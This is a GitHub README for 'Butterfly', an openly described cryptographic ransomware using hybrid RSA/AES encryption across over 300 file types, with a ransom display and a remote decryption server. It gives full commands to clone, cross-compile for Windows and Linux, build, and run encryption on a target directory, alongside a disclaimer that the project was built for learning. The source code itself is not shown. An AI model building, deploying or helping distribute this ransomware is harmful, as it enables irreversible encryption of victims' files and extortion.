# Butterfly
[![Build Status](https://jenkins.bierschi.com/buildStatus/icon?job=butterfly%2Fmaster)](https://jenkins.bierschi.com/job/butterfly/job/master/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/bierschi/butterfly/blob/master/LICENSE)
[![Linux](https://svgshare.com/i/Zhy.svg)](https://svgshare.com/i/Zhy.svg)
[![Windows](https://svgshare.com/i/ZhY.svg)](https://svgshare.com/i/ZhY.svg)
<!--[![macOS](https://svgshare.com/i/ZjP.svg)](https://svgshare.com/i/ZjP.svg)-->

<p align="left">
<img src="images/butterfly.png" width="300" height="300">
</p>

Butterfly is a cryptographic ransomware with the following features

- Hybrid Encryption (RSA Asymmetric/AES Symmetric Encryption) :heavy_check_mark:
- Offline Encryption :heavy_check_mark:
- Supports multiple Operating Systems (Linux :heavy_check_mark:, Windows :arrows_counterclockwise:, MacOS :x:)
- Supports over 300 File Extensions :heavy_check_mark:
- Webserver [bflyServerApp](https://github.com/bierschi/butterfly/tree/master/webserver) for a secure remote decryption :heavy_check_mark:
- Ransom Visualization with Browser :heavy_check_mark: GUI :x: Wallpaper :x:
- Connection to the TOR Network :arrows_counterclockwise:
- Bitcoin Payments :x:

## Disclaimer

Butterfly is a full-featured cryptographic ransomware application that irrevocably encrypts your data. This means careless
use leads to permanent data loss (No liability is accepted).
The main purpose for the butterfly project was just to build knowledge related to the increased occurrence of ransomwares. <br>

:exclamation: **Butterfly was never supposed to harm or threat other computers** :exclamation:

## Dependencies

Install compilers for the toolchain
<pre><code>
# GCC on Ubuntu
sudo apt-get install gcc g++

# Windows cross compiler for Ubuntu
sudo apt-get install mingw-w64
</code></pre>

Install openssl and boost filesystem libraries
<pre><code>
sudo apt-get install -y libssl-dev libboost-filesystem-dev
</code></pre>

If you enable the logging definition with cmake you also need to install the boost logging library
<pre><code>
sudo apt-get install -y libboost-log-dev
</code></pre>

## Build Butterfly

Build butterfly
<pre><code>
# Clone the repo and create the build/ folder
git clone https://github.com/bierschi/butterfly.git && cd butterfly
mkdir build && cd build

# Execute cmake with options
cmake -DCMAKE_TOOLCHAIN_FILE=../linux.cmake ../
(cmake -DCMAKE_TOOLCHAIN_FILE=../linux.cmake -DUNITTESTS=ON -DLOGGING=ON ../)

# Build the binary
make
</code></pre>

CMake Arguments 
<pre><code>
-DUNITTESTS=ON   # Enables the Unit Tests
-DLOGGING=ON     # Enables the boost logging framework
</code></pre>

## Usage and Examples

Print the available arguments for butterfly
<pre><code>
./butterfly --help
</code></pre>

<pre><code>
butterfly is a cryptographic ransomware

Usage: 
	butterfly --dir /home/butterfly/data/
	butterfly --dir /home/butterfly/data/ --protected

	butterfly --encrypt /home/butterfly/data/ 
	butterfly --decrypt /home/butterfly/data/ 

	butterfly --decrypt /home/butterfly/data/ --key /home/butterfly/butterfly/masterkeys/SPrivateRSA.pem

Options:
	-d,   --dir         Directory path to start the cryptographic ransomware (Encryption+Visualization+Payment+Decryption)
	-enc, --encrypt	    Encrypts all files in provided directory path and shows the ransom visualization
	-dec, --decrypt	    Decrypts all files in provided directory path, if the request to the remote server was successful
	-k,   --key         Masterkey for the decryption, if the remote server is not used (Corresponds to the embedded server public key)
	-p,   --protected   Saves all key files to the system (For manual decryption)
	-c,   --config	    Logger config path
	-v,   --version	    Show version information and quit
	-h,   --help	    Show this message and quit

butterfly homepage at: https://github.com/bierschi/butterfly
</code></pre>

Test the full functionalities of `butterfly`
<pre><code>
# Run the bflyServerApp for remote decryption
bflyServerApp --host 127.0.0.1 --port 8080 --key ../masterkeys/SPrivateRSA.pem

# Run the butterfly binary with --dir argument
./butterfly --dir /home/butterfly/data/
</code></pre>

Test the encryption + decryption mechanism separately (+ with remote decryption)
<pre><code>
# Run the bflyServerApp for remote decryption
bflyServerApp --host 127.0.0.1 --port 8080 --key ../masterkeys/SPrivateRSA.pem


# Start only the encryption
./butterfly --encrypt /home/butterfly/data

# Start only the decryption
./butterfly --decrypt /home/butterfly/data
</code></pre>

## Unit Tests

Install GTest
<pre><code>
sudo apt-get install libgtest-dev
cd /usr/src/gtest
sudo cmake CMakeLists.txt
sudo make

#copy or symlink libgtest.a and libgtest_main.a to your /usr/lib folder
sudo cp *.a /usr/lib
</code></pre>

Enable the Unit Tests with 
<pre><code>
cmake ../ -DUNITTESTS=ON 
</code></pre>

List all tests
<pre><code>
./butterflyUnitTests --gtest_list_tests
</code></pre>

Run the `butterfly` units
<pre><code>
./butterflyUnitTests
</code></pre>

## Changelog
All changes and versioning information can be found in the [CHANGELOG](https://github.com/bierschi/butterfly/blob/master/CHANGELOG.md)

## License
Copyright (c) 2021 Bierschneider Christian. See [LICENSE](https://github.com/bierschi/butterfly/blob/master/LICENSE)
for details